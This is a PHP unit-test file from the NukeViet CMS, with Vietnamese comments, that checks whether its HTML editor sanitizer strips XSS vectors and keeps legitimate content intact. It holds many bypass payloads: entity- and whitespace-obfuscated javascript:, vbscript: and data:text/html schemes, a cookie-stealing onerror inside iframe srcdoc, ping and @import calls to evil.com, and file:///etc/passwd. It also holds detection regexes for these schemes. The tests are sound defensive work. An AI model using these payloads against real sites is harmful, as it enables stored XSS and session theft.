<?php

/**
 * NukeViet Content Management System
 * @version 5.x
 * @author VINADES.,JSC <contact@vinades.vn>
 * @copyright (C) 2009-2025 VINADES.,JSC. All rights reserved
 * @license GNU/GPL version 2 or any later version
 * @see https://github.com/nukeviet The NukeViet CMS GitHub project
 */

namespace Tests\Unit;

use Tests\Support\UnitTester;

/**
 * Kiểm tra bảo mật class Request.
 *
 * @group security
 */
class RequestClassTest extends \Codeception\Test\Unit
{
    protected UnitTester $tester;

    protected function _before(): void
    {
    }

    protected function _after(): void
    {
        // Dọn dẹp $_POST để không ảnh hưởng test khác
        unset($_POST['bodytext']);
        unset($_GET['q']);
    }

    /**
     * Đưa một đoạn HTML qua bộ lọc của get_editor().
     */
    private function filterEditor(string $payload): string
    {
        global $nv_Request;

        $_POST['bodytext'] = $payload;

        return $nv_Request->get_editor('bodytext', '', NV_ALLOWED_HTML_TAGS);
    }

    /**
     * Mô phỏng bước giải mã entity mà browser thực hiện khi parse tài liệu.
     *
     * Kiểm tra trên chuỗi này mới phản ánh đúng thứ trình duyệt thực thi,
     * thay vì chuỗi thô còn nguyên entity trong CSDL.
     */
    private function asBrowserSees(string $html): string
    {
        return html_entity_decode($html, ENT_QUOTES | ENT_HTML5, 'UTF-8');
    }

    /**
     * get_editor() phải lọc bỏ onerror trong srcdoc của iframe.
     *
     * Nếu kết quả trả về vẫn còn chuỗi "onerror" thì Request
     * chưa vô hiệu hóa vector XSS qua iframe[srcdoc].
     *
     * @group security
     */
    public function testGetEditorMustStripOnerrorInIframeSrcdoc(): void
    {
        global $nv_Request;

        // Payload: iframe có srcdoc chứa img với event handler onerror dạng HTML-encoded
        $_POST['bodytext'] = 'aaaa<iframe srcdoc="&lt;img src=1 onerror=alert(document.cookie)&gt;"></iframe>';

        $result = $nv_Request->get_editor('bodytext', '', NV_ALLOWED_HTML_TAGS);

        // 1. onerror phải bị loại bỏ
        $this->assertStringNotContainsStringIgnoringCase(
            'onerror',
            $result,
            'Lỗi bảo mật XSS: get_editor() không lọc "onerror" trong srcdoc của iframe. '
            . 'Kết quả thực tế: ' . $result
        );

        // 2. attribute srcdoc phải được giữ lại (chỉ lọc nội dung nguy hiểm, không xóa cả attribute)
        $this->assertStringContainsStringIgnoringCase(
            'srcdoc',
            $result,
            'Attribute srcdoc bị xóa hoàn toàn thay vì chỉ lọc nội dung nguy hiểm bên trong.'
        );

        // 3. tag iframe phải được giữ lại
        $this->assertStringContainsStringIgnoringCase(
            'iframe',
            $result,
            'Tag iframe bị xóa, nhưng kịch bản này chỉ cần lọc nội dung srcdoc.'
        );
    }

    /**
     * get_editor() phải giữ nguyên srcdoc với nội dung HTML an toàn.
     *
     * @group security
     */
    public function testGetEditorPreservesSafeSrcdocContent(): void
    {
        global $nv_Request;

        $_POST['bodytext'] = '<iframe srcdoc="&lt;p&gt;Hello World&lt;/p&gt;"></iframe>';

        $result = $nv_Request->get_editor('bodytext', '', NV_ALLOWED_HTML_TAGS);

        $this->assertStringContainsStringIgnoringCase(
            'srcdoc',
            $result,
            'Attribute srcdoc với nội dung an toàn bị xóa không đúng.'
        );
        $this->assertStringContainsStringIgnoringCase(
            'Hello World',
            $result,
            'Nội dung văn bản an toàn trong srcdoc bị lọc mất.'
        );
    }

    /**
     * get_editor() phải loại bỏ attribute ping khỏi tag <a>.
     *
     * <a ping="https://evil.com/track"> khiến browser gửi POST request
     * đến URL tùy ý khi user click — vector SSRF và tracking lén lút.
     *
     * @group security
     */
    public function testGetEditorMustStripPingAttribute(): void
    {
        global $nv_Request;

        $_POST['bodytext'] = '<a href="https://example.com" ping="https://evil.com/track">Click me</a>';

        $result = $nv_Request->get_editor('bodytext', '', NV_ALLOWED_HTML_TAGS);

        $this->assertStringNotContainsStringIgnoringCase(
            'ping',
            $result,
            'Lỗi bảo mật SSRF: attribute ping không bị lọc khỏi tag <a>. '
            . 'Kết quả thực tế: ' . $result
        );

        // Tag <a> và href hợp lệ phải được giữ lại
        $this->assertStringContainsString('href', $result, 'Attribute href hợp lệ bị xóa nhầm.');
        $this->assertStringContainsString('Click me', $result, 'Nội dung text của <a> bị xóa nhầm.');
    }

    /**
     * get_editor() phải loại bỏ @import trong style attribute.
     *
     * <div style="@import url(https://evil.com/x.css)"> có thể gây
     * CSS injection trong một số browser/WebView context cũ.
     *
     * @group security
     */
    public function testGetEditorMustStripAtImportInStyleAttribute(): void
    {
        global $nv_Request;

        $_POST['bodytext'] = '<div style="@import url(https://evil.com/x.css);">content</div>';

        $result = $nv_Request->get_editor('bodytext', '', NV_ALLOWED_HTML_TAGS);

        $this->assertStringNotContainsStringIgnoringCase(
            '@import',
            $result,
            'Lỗi bảo mật CSS injection: @import trong style attribute không bị lọc. '
            . 'Kết quả thực tế: ' . $result
        );

        // Tag <div> và nội dung an toàn phải được giữ lại
        $this->assertStringContainsString('content', $result, 'Nội dung text hợp lệ bị xóa nhầm.');
    }

    /**
     * get_editor() phải loại bỏ @import dạng rải ký tự trong style attribute.
     *
     * `$search` trong filterAttr() normalize `@ i m p o r t` → `@import` trong $value,
     * sau đó blocking check phải loại bỏ attribute này.
     *
     * @group security
     */
    public function testGetEditorMustStripObfuscatedAtImportInStyleAttribute(): void
    {
        global $nv_Request;

        // Dạng rải ký tự bypass filter đơn giản kiểu str_contains
        $_POST['bodytext'] = '<div style="@ i m p o r t url(https://evil.com/x.css);">content</div>';

        $result = $nv_Request->get_editor('bodytext', '', NV_ALLOWED_HTML_TAGS);

        // Cả dạng rải ký tự lẫn dạng đã normalize đều không được có trong output
        $this->assertStringNotContainsStringIgnoringCase(
            '@ i m p o r t',
            $result,
            'Lỗi: @import obfuscated (dạng rải ký tự) vẫn còn trong style attribute. '
            . 'Kết quả thực tế: ' . $result
        );
        $this->assertStringNotContainsStringIgnoringCase(
            '@import',
            $result,
            'Lỗi: @import (sau normalize) vẫn còn trong style attribute. '
            . 'Kết quả thực tế: ' . $result
        );
    }

    /**
     * get_editor() phải chặn scheme javascript: bị che giấu bằng numeric HTML entity,
     * không phụ thuộc số lượng số 0 đứng trước mã ký tự.
     *
     * @group security
     */
    public function testGetEditorMustStripEntityObfuscatedJavascriptScheme(): void
    {
        global $nv_Request;

        // Các biến thể entity đều decode ra ký tự "j" (0x6a / 106)
        $schemes = [
            'hex không có số 0' => '&#x6a;avascript:',
            'hex 8 số 0' => '&#x000000006a;avascript:',
            'hex 9 số 0 (PoC gốc)' => '&#x0000000006a;avascript:',
            'hex 20 số 0' => '&#x000000000000000000006a;avascript:',
            'decimal 10 số 0' => '&#0000000000106;avascript:'
        ];

        foreach ($schemes as $label => $scheme) {
            $_POST['bodytext'] = '<iframe src="' . $scheme . 'alert(document.cookie)"></iframe>';

            $result = $nv_Request->get_editor('bodytext', '', NV_ALLOWED_HTML_TAGS);

            // Giải mã đúng như browser làm khi parse tài liệu
            $decoded = html_entity_decode($result, ENT_QUOTES | ENT_HTML5, 'UTF-8');

            $this->assertDoesNotMatchRegularExpression(
                '/j\s*a\s*v\s*a\s*s\s*c\s*r\s*i\s*p\s*t\s*:/i',
                $decoded,
                'Lỗi bảo mật Stored XSS (' . $label . '): scheme javascript: vẫn thành hình sau khi '
                . 'browser giải mã entity. Output: ' . $result
            );

            $this->assertStringNotContainsStringIgnoringCase(
                'src',
                $result,
                'Attribute src chứa scheme nguy hiểm (' . $label . ') phải bị loại bỏ hoàn toàn. '
                . 'Output: ' . $result
            );
        }
    }

    /**
     * get_editor() phải chặn các scheme nguy hiểm khác khi bị che giấu bằng entity.
     *
     * Cùng cơ chế với javascript:, kiểm tra thêm vbscript: và data:text/html
     * để chắc chắn việc canonicalize áp dụng cho toàn bộ allowlist scheme.
     *
     * @group security
     */
    public function testGetEditorMustStripEntityObfuscatedVbscriptAndDataScheme(): void
    {
        global $nv_Request;

        $payloads = [
            // v = 0x76, 9 số 0 đứng trước
            'vbscript entity' => '<a href="&#x0000000076;bscript:msgbox(1)">x</a>',
            // d = 0x64, 9 số 0 đứng trước
            'data:text/html entity' => '<iframe src="&#x0000000064;ata:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>'
        ];

        foreach ($payloads as $label => $payload) {
            $_POST['bodytext'] = $payload;

            $result = $nv_Request->get_editor('bodytext', '', NV_ALLOWED_HTML_TAGS);
            $decoded = html_entity_decode($result, ENT_QUOTES | ENT_HTML5, 'UTF-8');

            $this->assertDoesNotMatchRegularExpression(
                '/(v\s*b\s*s\s*c\s*r\s*i\s*p\s*t|d\s*a\s*t\s*a)\s*:/i',
                $decoded,
                'Lỗi bảo mật (' . $label . '): scheme nguy hiểm vẫn thành hình sau khi browser '
                . 'giải mã entity. Output: ' . $result
            );
        }
    }

    /**
     * URL http/https hợp lệ không được lọc nhầm.
     *
     * Chốt chặn false positive cho các test canonicalize entity ở trên: việc siết
     * bộ lọc scheme không được làm hỏng nội dung bình thường.
     *
     * @group security
     */
    public function testGetEditorPreservesSafeUrlScheme(): void
    {
        global $nv_Request;

        $_POST['bodytext'] = '<a href="https://nukeviet.vn/vi/">NukeViet</a>';

        $result = $nv_Request->get_editor('bodytext', '', NV_ALLOWED_HTML_TAGS);

        $this->assertStringContainsString('href', $result, 'Attribute href hợp lệ bị xóa nhầm. Output: ' . $result);
        $this->assertStringContainsString('nukeviet.vn', $result, 'URL hợp lệ bị lọc mất. Output: ' . $result);
        $this->assertStringContainsString('NukeViet', $result, 'Nội dung text của <a> bị xóa nhầm. Output: ' . $result);
    }

    /**
     * Quét rộng các cách che giấu scheme nguy hiểm trong attribute URL.
     *
     * Mỗi biến thể phải cho ra cùng một kết quả: attribute bị loại bỏ, và sau khi
     * browser giải mã entity thì không còn scheme thực thi được nào thành hình.
     *
     * @group security
     */
    public function testGetEditorMustStripDangerousSchemeInAllObfuscations(): void
    {
        $payloads = [
            // Ký tự điều khiển / khoảng trắng chen giữa (browser bỏ qua khi phân giải scheme)
            'tab named' => 'java&Tab;script:alert(1)',
            'newline named' => 'java&NewLine;script:alert(1)',
            'tab decimal' => 'java&#9;script:alert(1)',
            'tab hex' => 'java&#x9;script:alert(1)',
            'CR decimal' => 'java&#13;script:alert(1)',
            'null byte hex' => 'java&#x00;script:alert(1)',
            // Dấu hai chấm được mã hóa
            'colon named' => 'javascript&colon;alert(1)',
            'colon decimal' => 'javascript&#58;alert(1)',
            'colon decimal khong dau ;' => 'javascript&#58alert(1)',
            'colon hex' => 'javascript&#x3a;alert(1)',
            'colon hex nhieu so 0' => 'javascript&#x0000003a;alert(1)',
            // Biến dạng chữ hoa/thường và khoảng trắng
            'mixed case' => 'JaVaScRiPt:alert(1)',
            'khoang trang dau' => '   javascript:alert(1)',
            'rai ky tu' => 'j a v a s c r i p t :alert(1)',
            // URL-encoding
            'urlencode colon' => 'javascript%3Aalert(1)',
            'urlencode chu j' => '%6aavascript:alert(1)',
            // Các scheme nguy hiểm khác
            'vbscript' => 'vbscript:msgbox(1)',
            'livescript' => 'livescript:alert(1)',
            'mocha' => 'mocha:alert(1)',
            'vbscript entity' => 'vb&#115;cript:msgbox(1)'
        ];

        foreach ($payloads as $label => $scheme) {
            $result = $this->filterEditor('<a href="' . $scheme . '">x</a>');
            $decoded = $this->asBrowserSees($result);

            $this->assertDoesNotMatchRegularExpression(
                '/(j\s*a\s*v\s*a\s*s\s*c\s*r\s*i\s*p\s*t|v\s*b\s*s\s*c\s*r\s*i\s*p\s*t|l\s*i\s*v\s*e\s*s\s*c\s*r\s*i\s*p\s*t|m\s*o\s*c\s*h\s*a)\s*:/i',
                $decoded,
                'Lỗi bảo mật XSS (' . $label . '): scheme nguy hiểm vẫn thành hình sau khi browser '
                . 'giải mã. Output: ' . $result
            );

            $this->assertStringNotContainsStringIgnoringCase(
                'href',
                $result,
                'Attribute href chứa scheme nguy hiểm (' . $label . ') phải bị loại bỏ. Output: ' . $result
            );
        }
    }

    /**
     * Payload bên trong data: URL phải được soi sau khi giải mã đúng như browser.
     *
     * Regression cho lỗ hổng: filterAttr() chỉ urldecode() payload của data: URL dạng
     * plain trong khi browser còn giải mã cả HTML entity, nên payload viết bằng
     * &lt; &gt; không có tag nào cho filterTags() nhìn thấy và attribute độc hại
     * được giữ nguyên. Nhánh srcdoc xử lý đúng, nhánh data: URL thì không.
     *
     * @group security
     */
    public function testGetEditorMustInspectDecodedDataUrlPayload(): void
    {
        $payloads = [
            'tag tho' => 'data:text/html,<script>alert(1)</script>',
            'tag bang entity' => 'data:text/html,&lt;script&gt;alert(document.domain)&lt;/script&gt;',
            'event handler bang entity' => 'data:text/html,&lt;svg onload=alert(1)&gt;',
            'img onerror bang entity' => 'data:text/html,&lt;img src=x onerror=alert(1)&gt;',
            'tag bang URL-encode' => 'data:text/html,%3Cscript%3Ealert(1)%3C/script%3E',
            'base64' => 'data:text/html;base64,' . base64_encode('<script>alert(1)</script>'),
            'base64 co svg onload' => 'data:text/html;base64,' . base64_encode('<svg onload=alert(1)></svg>')
        ];

        foreach ($payloads as $label => $payload) {
            $result = $this->filterEditor('<iframe src="' . $payload . '"></iframe>');

            // Dựng lại đúng nội dung mà browser sẽ nạp vào iframe
            $loaded = '';
            if (preg_match('/src="([^"]*)"/', $result, $m)) {
                $loaded = $this->asBrowserSees($m[1]);
                if (preg_match('/base64,(.*)$/is', $loaded, $b)) {
                    $loaded = (string) base64_decode($b[1], true);
                }
                $loaded = urldecode($loaded);
            }

            $this->assertDoesNotMatchRegularExpression(
                '/<\s*[a-z]/i',
                $loaded,
                'Lỗi bảo mật XSS (' . $label . '): data: URL vẫn nạp được HTML vào iframe. '
                . 'Browser sẽ render: ' . $loaded . ' — Output: ' . $result
            );
        }
    }

    /**
     * data: URL media hợp lệ không được lọc nhầm, còn kiểu MIME không được phép phải bị gỡ.
     *
     * Chốt chặn false positive cho test soi payload data: URL ở trên.
     *
     * @group security
     */
    public function testGetEditorPreservesSafeDataUrl(): void
    {
        // Ảnh PNG nhúng dạng base64 - trường hợp dùng hợp lệ phổ biến nhất
        $result = $this->filterEditor('<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==" alt="anh">');
        $this->assertStringContainsString(
            'data:image/png;base64',
            $result,
            'Ảnh PNG nhúng dạng data: URL bị lọc nhầm. Output: ' . $result
        );

        // SVG nhúng trực tiếp vẫn phải cho qua ở media tag hợp lệ
        $result = $this->filterEditor('<img src="data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\'%3E%3C/svg%3E" alt="svg">');
        $this->assertStringContainsString(
            'data:image/svg+xml',
            $result,
            'SVG nhúng dạng data: URL bị lọc nhầm trên tag img. Output: ' . $result
        );

        // data:text/html không còn được phép dù payload an toàn
        $result = $this->filterEditor('<iframe src="data:text/html,&lt;p&gt;Xin chào&lt;/p&gt;"></iframe>');
        $this->assertStringNotContainsStringIgnoringCase(
            'data:text/html',
            $result,
            'data:text/html phải bị loại bỏ khỏi iframe. Output: ' . $result
        );

        // SVG không được phép trên tag không phải media
        $result = $this->filterEditor('<iframe src="data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\'%3E%3C/svg%3E"></iframe>');
        $this->assertStringNotContainsStringIgnoringCase(
            'data:image/svg+xml',
            $result,
            'SVG dạng data: URL phải bị loại bỏ khỏi iframe. Output: ' . $result
        );
    }

    /**
     * Tên attribute event handler bị che giấu vẫn phải bị nhận diện.
     *
     * @group security
     */
    public function testGetEditorMustStripObfuscatedEventHandlerName(): void
    {
        $names = [
            'chu hoa' => 'ONERROR',
            'hoa thuong lan lon' => 'oNeRrOr',
            'ky tu dau bang entity' => '&#111;nerror',
            'ky tu giua bang entity' => 'on&#101;rror',
            'entity hex nhieu so 0' => '&#x0000006f;nerror',
            'chen null byte entity' => 'on&#x00;error',
            'chen tab entity' => 'on&#9;error'
        ];

        foreach ($names as $label => $name) {
            $result = $this->filterEditor('<img src="/anh.png" ' . $name . '="alert(1)">');

            $this->assertStringNotContainsStringIgnoringCase(
                'error',
                $this->asBrowserSees($result),
                'Lỗi bảo mật XSS (' . $label . '): event handler onerror bị che giấu không được '
                . 'nhận diện. Output: ' . $result
            );
        }
    }

    /**
     * Nội dung hợp lệ không được bộ lọc làm hỏng.
     *
     * @group security
     */
    public function testGetEditorPreservesLegitimateContent(): void
    {
        // URL có percent-encoding tiếng Việt phải giữ nguyên từng ký tự
        $result = $this->filterEditor('<a href="/wiki/Ph%E1%BA%A1m_Tu%E1%BA%A5n">Phạm Tuấn</a>');
        $this->assertStringContainsString(
            '/wiki/Ph%E1%BA%A1m_Tu%E1%BA%A5n',
            $result,
            'URL percent-encoded bị bộ lọc làm hỏng. Output: ' . $result
        );

        // Tham số URL chứa chuỗi đã encode :// phải giữ nguyên
        $result = $this->filterEditor('<a href="/redirect?to=https%3A%2F%2Fnukeviet.vn">đi</a>');
        $this->assertStringContainsString(
            'https%3A%2F%2Fnukeviet.vn',
            $result,
            'Tham số URL chứa :// đã encode bị làm hỏng. Output: ' . $result
        );

        // Entity hợp lệ trong nội dung văn bản phải được giữ
        $result = $this->filterEditor('<p>Công ty AT&#38;T &amp; đối tác</p>');
        $this->assertStringContainsString('AT', $result, 'Nội dung văn bản bị lọc mất. Output: ' . $result);

        // Thẻ định dạng cơ bản và nội dung tiếng Việt có dấu
        $result = $this->filterEditor('<p><strong>Tiêu đề</strong> — nội dung <em>nghiêng</em></p>');
        $this->assertStringContainsString('Tiêu đề', $result, 'Nội dung tiếng Việt bị lọc mất. Output: ' . $result);
        $this->assertStringContainsString('<strong>', $result, 'Thẻ strong hợp lệ bị xóa. Output: ' . $result);
        $this->assertStringContainsString('<em>', $result, 'Thẻ em hợp lệ bị xóa. Output: ' . $result);
    }

    /**
     * Từ khóa nguy hiểm nằm trong path/query của URL chỉ là văn bản, không được gỡ oan.
     *
     * Chỉ scheme đứng đầu giá trị mới quyết định trình duyệt có thực thi hay không.
     *
     * @group security
     */
    public function testGetEditorKeepsDangerousKeywordInsideUrlPath(): void
    {
        $cases = [
            'tên file' => ['<img src="/uploads/javascript-logo.png">', '/uploads/javascript-logo.png'],
            'đường dẫn' => ['<a href="https://vi.wikipedia.org/wiki/JavaScript">JS</a>', '/wiki/JavaScript'],
            'query string' => ['<a href="/tim-kiem?q=javascript">tìm</a>', '?q=javascript'],
            'từ khóa khác' => ['<a href="https://vi.wikipedia.org/wiki/VBScript">VBS</a>', '/wiki/VBScript']
        ];

        foreach ($cases as $label => [$payload, $expected]) {
            $result = $this->filterEditor($payload);

            $this->assertStringContainsString(
                $expected,
                $result,
                'URL hợp lệ bị gỡ oan vì từ khóa nằm trong path/query (' . $label . '). Output: ' . $result
            );
        }
    }

    /**
     * Attribute văn bản thuần không bị gỡ vì chứa từ khóa nguy hiểm.
     *
     * @group security
     */
    public function testGetEditorKeepsDangerousKeywordInTextAttributes(): void
    {
        $cases = [
            'title' => ['<a href="/bai-viet" title="Bài viết về JavaScript">x</a>', 'title'],
            'alt' => ['<img src="/a.png" alt="Sơ đồ luồng javascript">', 'alt'],
            'class' => ['<div class="javascript-highlight">code</div>', 'class']
        ];

        foreach ($cases as $label => [$payload, $expected]) {
            $result = $this->filterEditor($payload);

            $this->assertStringContainsString(
                $expected,
                $result,
                'Attribute văn bản thuần bị gỡ oan vì chứa từ khóa (' . $label . '). Output: ' . $result
            );
        }
    }

    /**
     * Scheme ngoài allowlist phải bị chặn, kể cả loại không có trong danh sách cấm cũ.
     *
     * Danh sách scheme nguy hiểm không bao giờ đủ: view-source:, jar:, file:, blob:,
     * intent:, ws: đều từng lọt qua bộ lọc dạng liệt kê từ khóa.
     *
     * @group security
     */
    public function testGetEditorMustStripSchemesOutsideAllowlist(): void
    {
        $urls = [
            'view-source:https://nukeviet.vn',
            'jar:http://evil.vn/x.jar!/',
            'file:///etc/passwd',
            'blob:https://evil.vn/1234',
            'intent://evil.vn#Intent;end',
            'ws://evil.vn',
            'feed:javascript:alert(1)'
        ];

        foreach ($urls as $url) {
            $result = $this->filterEditor('<a href="' . $url . '">x</a>');

            $this->assertStringNotContainsStringIgnoringCase(
                'href',
                $result,
                'Scheme ngoài allowlist vẫn được giữ lại: ' . $url . ' — Output: ' . $result
            );
        }
    }

    /**
     * Các scheme hợp lệ thường dùng phải được giữ.
     *
     * @group security
     */
    public function testGetEditorKeepsAllowlistedSchemes(): void
    {
        $urls = [
            'https://nukeviet.vn/vi/',
            'http://nukeviet.vn',
            'ftp://ftp.nukeviet.vn/pub',
            'mailto:contact@vinades.vn',
            'tel:+842471096688',
            'sms:+84901234567',
            'skype:nukeviet?call',
            'viber://chat?number=%2B84901234567',
            'zalo://conversation?phone=84901234567',
            '/duong-dan-tuong-doi',
            '#neo-trong-trang'
        ];

        foreach ($urls as $url) {
            $result = $this->filterEditor('<a href="' . $url . '">x</a>');

            $this->assertStringContainsStringIgnoringCase(
                'href',
                $result,
                'URL hợp lệ bị chặn: ' . $url . ' — Output: ' . $result
            );
        }
    }

    /**
     * Nới lỏng theo nhóm attribute không được làm hở attribute chưa phân loại.
     *
     * style và srcset cố ý giữ phép kiểm tra chặt: từ khóa nguy hiểm trong đó có hại ở
     * mọi vị trí chứ không riêng đầu chuỗi.
     *
     * @group security
     */
    public function testGetEditorKeepsStrictCheckForUnclassifiedAttributes(): void
    {
        $result = $this->filterEditor('<div style="background:url(javascript:alert(1))">x</div>');
        $this->assertStringNotContainsStringIgnoringCase(
            'javascript',
            $result,
            'style chứa javascript: trong url() phải bị gỡ. Output: ' . $result
        );

        $result = $this->filterEditor('<img src="/a.png" srcset="/a.png 1x, javascript:alert(1) 2x">');
        $this->assertStringNotContainsStringIgnoringCase(
            'srcset',
            $result,
            'srcset chứa scheme nguy hiểm ở giữa giá trị phải bị gỡ. Output: ' . $result
        );
    }

    /**
     * srcdoc phải được ghi lại từ giá trị canonicalize, không phải giá trị deobfuscate.
     *
     * Đây là attribute duy nhất mà filterAttr() lọc rồi ghi ngược giá trị ra. Nếu lấy
     * nguồn từ bản giải mã quá tay (dùng để phát hiện tấn công) thì percent-encoding
     * trong nội dung hợp lệ sẽ bị giải mã mất và nội dung lưu vào CSDL bị sai lệch.
     *
     * @group security
     */
    public function testGetEditorSerializesSrcdocFromCanonicalValue(): void
    {
        $result = $this->filterEditor('<iframe srcdoc="&lt;p&gt;giảm giá 50%25&lt;/p&gt;"></iframe>');

        $this->assertStringContainsString(
            '50%25',
            $result,
            'Nội dung srcdoc bị giải mã quá tay trước khi ghi lại: "50%25" biến thành "50%". '
            . 'Output: ' . $result
        );
    }

    /**
     * get_string() trên biến GET không được làm hỏng giá trị hợp lệ.
     *
     * security_get() dùng chung hàm giải mã với bộ phát hiện XSS. Hàm đó cố ý
     * giải mã quá tay (%XX, xóa "://") để lộ ra ý đồ tấn công - phù hợp cho việc
     * *phát hiện*, nhưng ở đây giá trị sau khi giải mã lại được *trả về cho ứng dụng*,
     * nên tham số hợp lệ bị biến dạng.
     *
     * @group security
     */
    public function testSecurityGetMustNotCorruptLegitimateValues(): void
    {
        global $nv_Request;

        $cases = [
            'percent-encoding tiếng Việt' => ['Ph%E1%BA%A1m_Tu%E1%BA%A5n', 'Ph%E1%BA%A1m_Tu%E1%BA%A5n'],
            'URL đã encode ://' => ['https%3A%2F%2Fnukeviet.vn', 'https%3A%2F%2Fnukeviet.vn'],
            'phần trăm' => ['giam gia 50%25', 'giam gia 50%25']
        ];

        foreach ($cases as $label => [$input, $expected]) {
            $_GET['q'] = $input;

            $this->assertSame(
                $expected,
                $nv_Request->get_string('q', 'get', ''),
                'Giá trị GET hợp lệ (' . $label . ') bị security_get() làm hỏng.'
            );
        }
    }
}
